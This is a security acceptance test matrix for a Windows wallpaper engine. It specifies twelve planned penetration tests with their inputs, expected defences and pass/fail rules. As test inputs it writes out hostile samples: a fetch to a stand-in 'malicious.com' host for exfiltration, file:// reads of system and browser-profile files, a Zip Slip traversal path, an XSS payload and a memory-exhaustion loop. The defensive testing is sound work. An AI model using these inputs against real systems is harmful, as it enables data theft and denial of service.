# KinetiWall — Security and Privacy Acceptance Matrix
**Document ID:** `KW-QAR-005`  
**Deliverable:** Deliverable E — Security and Privacy Acceptance Matrix  
**Phase:** 1 — Project Research, Requirements & Feasibility  
**Step:** 6 of 90 — Acceptance Criteria, Success Metrics & Risk Register  
**Status:** COMPLETE (Auditable Threat Matrix Baseline)  
**Authority:** Security Architecture & Privacy Engineering Lead  
**Date:** 2026-11-10  

---

## 1. Threat Model & Security Posture

KinetiWall runs user-imported multimedia, interactive HTML5/JavaScript, and WebGL code on the Windows desktop. If improperly sandboxed, wallpaper packages could be exploited as **Trojan horses, local privilege escalation vectors, or surveillance tools**.

### Foundational Security Posture
1. **Zero-Trust for Content:** All user-imported wallpapers (videos, web scripts, manifests) are treated as untrusted third-party inputs.
2. **Least-Privilege Execution:** KinetiWall runs entirely in Windows User Mode (Medium Integrity Level). It **never requests UAC elevation** and runs players under restricted security tokens (`KW-NF-011`).
3. **Strict Local Origin:** Web wallpapers execute under a virtual domain (`https://kinetiwall.local/`) with CORS denial and blocked disk traversal (`KW-NF-016`).
4. **Transient Privacy:** Audio loopback data exists solely in volatile memory buffers for real-time FFT math. Zero bytes are written to disk or transmitted over networks (`KW-NG-005`).

---

## 2. Threat-Based Security Acceptance Matrix

The matrix below catalogs 12 high-severity penetration attack scenarios, defining the threat, test input, expected defense, observable evidence, and pass/fail rules:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                   12 THREAT-BASED PENETRATION SCENARIOS                     │
├─────────┬─────────────────────────────┬──────────────┬──────────────────────┤
│ Test ID │ Attack / Vulnerability Area │ Threat Level │ Expected Protection  │
├─────────┼─────────────────────────────┼──────────────┼──────────────────────┤
│ SEC-01  │ Named Pipe DACL Hijacking   │ CRITICAL     │ Access Denied (Win32)│
│ SEC-02  │ IPC Schema Fuzzing & Buffer │ HIGH         │ Malformed JSON Drop  │
│ SEC-03  │ Zip Slip Path Traversal     │ CRITICAL     │ Canonical Path Check │
│ SEC-04  │ Web Wallpaper CORS Exfil    │ HIGH         │ Network Request Block│
│ SEC-05  │ Local File Directory Escape │ CRITICAL     │ Mapped Host Boundary │
│ SEC-06  │ Hardware Device Access (Mic)│ HIGH         │ Permission Auto-Deny │
│ SEC-07  │ Untrusted Native Process    │ CRITICAL     │ Process Spawning Deny│
│ SEC-08  │ Manifest Schema Injection   │ MEDIUM       │ Strict Serde Parser  │
│ SEC-09  │ Volatile Audio Serialization│ CRITICAL     │ Zero Disk Write (0 B)│
│ SEC-10  │ Remote Telemetry Beaconing  │ CRITICAL     │ Zero Network Packets │
│ SEC-11  │ Web Memory Bomb Exhaustion  │ HIGH         │ 500 MB Job Quota Kill│
│ SEC-12  │ Screen Scraping Infiltration│ CRITICAL     │ Zero BitBlt / Hook   │
└─────────┴─────────────────────────────┴──────────────┴──────────────────────┘
```

---

## 3. Exhaustive Security Scenario Specifications

### `SEC-01`: Unauthorized Named Pipe IPC Access (DACL Verification)
- **Threat Tested:** A malicious unprivileged process running under another user account or low-integrity container attempts to connect to `\\.\pipe\kinetiwall-ipc-{SessionId}` to execute unauthorized player commands.
- **Preconditions:** Core daemon running and listening on local Named Pipe.
- **Test Input:** Secondary Windows user account executes a script attempting `CreateFileW` connection to the pipe.
- **Expected Protection:** Windows Object Security DACL restricts pipe access exclusively to the interactive logon SID (`WinLocalSystemSid` + current user SID).
- **Observable Evidence:** Win32 API returns `ERROR_ACCESS_DENIED` (5) to the attacking process; security audit log records blocked connection attempt.
- **Residual Risk:** Low; native Windows NT security descriptor enforcement.
- **Severity:** `CRITICAL`
- **Pass / Fail Rule:** PASS if connection fails with `ERROR_ACCESS_DENIED`. FAIL if pipe handle is granted.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-02`: Malformed IPC Payload & Oversized Buffer Fuzzing
- **Threat Tested:** Attempting to trigger buffer overflows, memory corruption, or unhandled panics in `kinetiwall-core.exe` via corrupted IPC streams.
- **Preconditions:** Active Named Pipe IPC connection established.
- **Test Input:** Fuzzing tool transmits 10,000 randomized packets: (a) oversized 50 MB payloads, (b) invalid UTF-8 byte sequences, (c) deeply nested JSON objects, (d) null bytes.
- **Expected Protection:** Framing layer enforces a 1 MB payload ceiling; Serde JSON deserializer validates schema; unparsed or invalid packets are dropped with diagnostic warning.
- **Observable Evidence:** Engine memory remains stable; zero unhandled panics; valid subsequent commands execute normally.
- **Residual Risk:** Low (Rust memory safety eliminates buffer overflows).
- **Severity:** `HIGH`
- **Pass / Fail Rule:** PASS if daemon drops malformed packets without crashing. FAIL if daemon panics, crashes, or leaks memory.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-03`: Malicious Archive Extraction (Zip Slip Path Traversal)
- **Threat Tested:** An imported `.kwall` / `.zip` wallpaper archive contains filenames with relative directory traversal sequences (`../../../../Windows/System32/malicious.dll`) attempting to overwrite system files.
- **Preconditions:** User drags-and-drops archive onto Gallery UI.
- **Test Input:** Specially crafted synthetic ZIP archive containing path traversal entries.
- **Expected Protection:** Extraction engine canonicalizes target path using `std::fs::canonicalize`, verifies destination is strictly prefixed by `%LOCALAPPDATA%\KinetiWall\wallpapers\`, and aborts extraction if escape is detected (`KW-NF-014`).
- **Observable Evidence:** Extraction immediately aborts; error `SECURITY_PATH_TRAVERSAL_DETECTED` logged; zero files written outside target folder.
- **Residual Risk:** Very Low.
- **Severity:** `BLOCKER`
- **Pass / Fail Rule:** PASS if traversal detected and extraction blocked. FAIL if any file is written outside wallpaper directory.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-04`: Web Wallpaper Cross-Origin Data Exfiltration (CORS Denial)
- **Threat Tested:** A malicious HTML/JavaScript wallpaper attempts to exfiltrate user data or fetch remote command scripts via `fetch('https://malicious.com/api')` or WebSocket.
- **Preconditions:** Interactive web wallpaper executing inside WebView2 container.
- **Test Input:** Web script invokes `fetch`, `XMLHttpRequest`, and `WebSocket` targeting external domains.
- **Expected Protection:** WebView2 Virtual Host Directory Mapping configured with `COREWEBVIEW2_HOST_RESOURCE_ACCESS_KIND_DENY_CORS`; CSP header enforces `default-src 'self'`.
- **Observable Evidence:** Browser console displays CORS / CSP violation errors; WireShark packet inspection verifies zero outbound DNS or HTTP connections.
- **Residual Risk:** Low.
- **Severity:** `CRITICAL`
- **Pass / Fail Rule:** PASS if all external requests fail. FAIL if any HTTP/WebSocket connection succeeds.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-05`: Local Filesystem Directory Traversal via WebView2
- **Threat Tested:** JavaScript executing inside web wallpaper attempts to read sensitive user files via `fetch('file:///C:/Users/victim/AppData/Local/Microsoft/Edge/User Data')`.
- **Preconditions:** Web wallpaper active.
- **Test Input:** JavaScript attempts `fetch('file:///C:/Windows/win.ini')` and relative path requests (`https://kinetiwall.local/../../sensitive.txt`).
- **Expected Protection:** WebView2 `file://` scheme disabled; virtual host mapping strictly binds root to wallpaper directory.
- **Observable Evidence:** WebView2 returns HTTP 403 Forbidden or network access error.
- **Residual Risk:** Low.
- **Severity:** `BLOCKER`
- **Pass / Fail Rule:** PASS if file reading blocked. FAIL if contents of local file outside wallpaper directory are accessed.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-06`: Unauthorized Hardware Device Access (Mic / Camera / Location)
- **Threat Tested:** Web wallpaper script invokes WebRTC / HTML5 device APIs (`navigator.mediaDevices.getUserMedia`) to spy on user audio/video or query geolocation.
- **Preconditions:** Web wallpaper active.
- **Test Input:** JavaScript executes `navigator.mediaDevices.getUserMedia({ audio: true, video: true })` and `navigator.geolocation.getCurrentPosition()`.
- **Expected Protection:** WebView2 event handler `PermissionRequested` intercepts all hardware permission requests and unconditionally sets `State = COREWEBVIEW2_PERMISSION_STATE_DENY`.
- **Observable Evidence:** JavaScript promise rejected with `NotAllowedError`; zero permission prompts displayed to user.
- **Residual Risk:** Low.
- **Severity:** `HIGH`
- **Pass / Fail Rule:** PASS if permission denied without user prompt. FAIL if camera/microphone access granted or UI prompt displayed.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-07`: Arbitrary Native Process Spawning
- **Threat Tested:** Untrusted wallpaper attempts to launch external executables (`cmd.exe`, `powershell.exe`) via HTML `<a href="file.exe">` or protocol handlers.
- **Preconditions:** Web wallpaper loaded.
- **Test Input:** JavaScript executes `window.open('calc.exe')` or triggers custom URI scheme (`steam://`, `discord://`).
- **Expected Protection:** WebView2 `NewWindowRequested` and `NavigationStarting` event handlers cancel all non-internal navigations (`e.Handled = TRUE`).
- **Observable Evidence:** Zero child processes spawned; navigation canceled in WebView2 event log.
- **Residual Risk:** Low.
- **Severity:** `BLOCKER`
- **Pass / Fail Rule:** PASS if external execution blocked. FAIL if calculator or shell executes.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-08`: Manifest Schema Injection & Deserialization Attack
- **Threat Tested:** Injecting malicious properties, prototype pollution, or invalid types into `project.json` to exploit the Gallery UI or player parser.
- **Preconditions:** Gallery UI importing wallpaper package.
- **Test Input:** `project.json` with 1,000-deep nested objects, negative slider ranges, and HTML injection payloads in `title` (`<script>alert(1)</script>`).
- **Expected Protection:** Rust Serde parser enforces strict typed structs; Tauri web frontend uses DOM sanitization (Svelte/React auto-escaping).
- **Observable Evidence:** HTML rendered as plain text string; parser rejects malformed schemas.
- **Residual Risk:** Low.
- **Severity:** `MEDIUM`
- **Pass / Fail Rule:** PASS if HTML payload rendered safely as text. FAIL if JavaScript executes in Gallery UI.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-09`: Volatile WASAPI Audio Data Leakage Verification
- **Threat Tested:** Audio loopback capture thread accidentally writes raw PCM audio or FFT frequency logs to disk or crash logs, violating privacy promises (`KW-NG-005`).
- **Preconditions:** System audio active; WASAPI audio visualizer running for 24 hours.
- **Test Input:** Normal audio playback of private speech / voice calls.
- **Expected Protection:** Ring buffers allocated strictly in volatile heap memory; zero file I/O calls in audio crate; crash handlers strip memory dumps of audio buffers.
- **Observable Evidence:** Process Monitor file write log filtering on KinetiWall PIDs confirms exactly 0 bytes written to disk by audio subsystem.
- **Residual Risk:** Low.
- **Severity:** `CRITICAL`
- **Pass / Fail Rule:** PASS if 0 bytes written. FAIL if audio samples found on disk.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-10`: Telemetry & Remote Tracking Sniffer Audit
- **Threat Tested:** Application secretly transmits analytics pings, hardware specs, or usage metadata to cloud endpoints (`KW-NG-002`).
- **Preconditions:** KinetiWall installed and running on network-connected test PC.
- **Test Input:** 48 hours of normal application usage (wallpaper switching, settings changes).
- **Expected Protection:** Zero HTTP/networking libraries compiled into core controller; zero analytical endpoints configured.
- **Observable Evidence:** WireShark network capture filter `ip.addr != 127.0.0.1` records exactly 0 packets emitted by KinetiWall executables.
- **Residual Risk:** Zero.
- **Severity:** `CRITICAL`
- **Pass / Fail Rule:** PASS if 0 packets detected. FAIL if any outbound packet emitted.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-11`: Web Player Resource Bomb & Memory Exhaustion Attack
- **Threat Tested:** Web wallpaper contains malicious infinite allocation loops (`while(true) { arr.push(new Array(1000000)); }`) designed to freeze Windows.
- **Preconditions:** Web player active.
- **Test Input:** JavaScript memory leak bomb executing.
- **Expected Protection:** Windows Job Object memory limit (500 MB hard ceiling) terminates the runaway child process automatically.
- **Observable Evidence:** Process terminates cleanly; core daemon detects crash, reports memory limit breach, and reverts to static wallpaper.
- **Residual Risk:** Low.
- **Severity:** `HIGH`
- **Pass / Fail Rule:** PASS if runaway player killed before exceeding 500 MB; OS remains responsive. FAIL if entire PC freezes or runs out of RAM.
- **Status:** `NOT RUN (PLANNED)`

### `SEC-12`: Anti-Screen-Scraping & Desktop Surveillance Audit
- **Threat Tested:** Wallpaper engine secretly captures desktop screenshots or inspects contents of other open windows (`KW-NF-018`).
- **Preconditions:** KinetiWall active alongside private desktop windows (banking/passwords).
- **Test Input:** Binary reverse-engineering and symbol audit.
- **Expected Protection:** Source code and binary contain zero invocations of `BitBlt` capturing the virtual desktop, zero `GetWindowDC`, zero DXGI desktop duplication APIs.
- **Observable Evidence:** Binary symbol audit confirms absence of screen capture APIs; Windows security tokens operate without capture permissions.
- **Residual Risk:** Zero.
- **Severity:** `CRITICAL`
- **Pass / Fail Rule:** PASS if symbol audit confirms zero capture routines. FAIL if desktop scraping routines exist.
- **Status:** `NOT RUN (PLANNED)`

